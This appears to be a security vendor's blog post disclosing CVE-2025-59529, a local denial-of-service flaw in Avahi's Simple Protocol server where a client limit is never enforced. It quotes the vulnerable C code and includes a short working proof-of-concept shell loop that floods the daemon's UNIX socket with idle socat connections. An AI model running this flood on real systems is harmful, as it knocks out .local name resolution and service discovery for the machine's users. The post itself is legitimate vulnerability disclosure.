---
schema_version: "1.0.0"
document_id: "7b29f41bb166b2fc6b98226bdb48c86b2704841b6d899fb43eccd5b2ce5557e1"
company_key: "yc-zeropath"
company: "ZeroPath"
source_id: "yc-zeropath-news-import-51f20a74ff70"
canonical_url: "https://zeropath.com/blog/avahi-simple-protocol-server-dos-cve-2025-59529"
published_at: "2025-11-18T00:00:00+00:00"
first_seen_at: "2026-07-24T06:51:45.842756+00:00"
fetched_at: "2026-07-28T21:27:35.329570+00:00"
content_hash: "sha256:570dbafed7ce3a439d2409c94a5ead1136d0395192f7a905780b598d0c3f3b21"
---

# Avahi Simple Protocol Server DoS (CVE-2025-59529)

# Avahi Simple Protocol Server DoS (CVE-2025-59529)


*TL;DR* — ZeroPath's AI-powered SAST found a business-logic vulnerability in Avahi, where the daemon kept accepting new Simple Protocol clients even after a configured limit should have kicked in. This let any local user exhaust memory and FDs until the daemon becomes unresponsive, breaking .local name resolution and services that rely on mDNS/DNS-SD.


---


## Background


Avahi provides multicast DNS and DNS Service Discovery on Linux, commonly known as Bonjour compatibility. It is widely shipped by Linux distributions and is used by the nss-mdns module so that standard libc name lookups can resolve .local hostnames and link-local addresses without manual DNS configuration.


## What we found


### The limit that never limits


Scanning Avahi with ZeroPath's AI-powered SAST, we found that the Avahi code defined a maximum client limit,` CLIENTS_MAX` , which was documented to limit the maximum number of connections that a single client (user) could keep open at any one time. However, Avahi's main worker loop did not actually enforce this limit in its Simple Protocol code, calling` accept()` unconditionally:


```text
static     void     server_work  (  AVAHI_GCC_UNUSED AvahiWatch   *  watch  ,     int   fd  ,   AvahiWatchEvent events  ,     void     *  userdata  )     {
Server   *  s   =   userdata  ;


assert  (  s  )  ;


if     (  events   &   AVAHI_WATCH_IN  )     {
int   cfd  ;


if     (  (  cfd   =     accept  (  fd  ,     NULL  ,     NULL  )  )     <     0  )
avahi_log_error  (  "accept(): %s"  ,     strerror  (  errno  )  )  ;
else
client_new  (  s  ,   cfd  )  ;
}
}
```


Instead of dropping potentially-malicious clients, the code simply accepted and held open each new connection unconditionally, indefinitely. Once Avahi hit the process file descriptor ceiling, the loop repeatedly failed with` EMFILE` and logged an error for every incoming connection, compounding the resource pressure by hammering the logger.


## Impact


- Any unprivileged local user can force Avahi to consume memory and file descriptors until it is unresponsive, effectively a local DoS.
- System load rises due to log storms as each failed` accept()` generates an error entry.
- mDNS and DNS-SD resolution fail during the event, which breaks discovery, and hostname resolution for .local and link-local addresses through nss-mdns.
- Secondary effects include delays or failures for desktop shells, service browsers, IDEs, and automation tools that expect zeroconf to be available.


Given the local attack vector and the availability impact, we rate this as moderate severity. The CVE record is CVE-2025-59529.


## Proof of concept


To demonstrate this vulnerability, we can simply flood the UNIX simple-protocol socket with idle connections like so:


```text
for     i     in     $(  seq     1     4000  )  ;     do
socat - UNIX-CONNECT:/run/avahi-daemon/socket   >  /dev/null   2  >  &1     &
done
wait
```


Watching avahi-daemon's memory/FD count grow until it becomes unresponsive or crashes, we'll see Avahi start to log messages like this:


```text
accept(): Too many open files
accept(): Too many open files
accept(): Too many open files
...


```


## Wrapping Up


The most difficult-to-find vulnerabilities in any codebase are those such that there is no code at all; missing protection, missing checks, and missing logic. LLMs have been shown to have a remarkable skill for finding logical inconsistencies in code like in this example: our system inferred that the` CLIENTS_MAX` variable should have limited the amount of connections a single user could make to the Avahi daemon based on its documentation and variable name, and reported that the logic disagreed with the actual code. These types of issues – logical flaws leading to security vulnerabilities – continue to be found with ZeroPath, and we're excited what the future holds in its ability to find and fix even more issues.
